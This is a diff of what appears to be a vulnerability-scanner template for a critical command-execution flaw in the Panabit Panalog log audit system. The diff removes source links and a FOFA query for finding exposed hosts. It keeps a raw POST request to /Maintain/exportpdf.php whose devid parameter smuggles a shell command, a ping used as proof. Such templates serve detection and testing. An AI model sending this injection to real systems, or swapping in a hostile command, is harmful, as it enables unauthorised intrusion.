@@ -3,12 +3,8 @@ info:
   name: Panabit Panalog大数据日志审计系统 命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hanb19lhgewvnm4v'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hanb19lhgewvnm4v
-    fofa: app="Panabit-Panalog"
 http:
 - raw:
   - 'POST /Maintain/exportpdf.php HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     devid='';ping www.baidu.com;
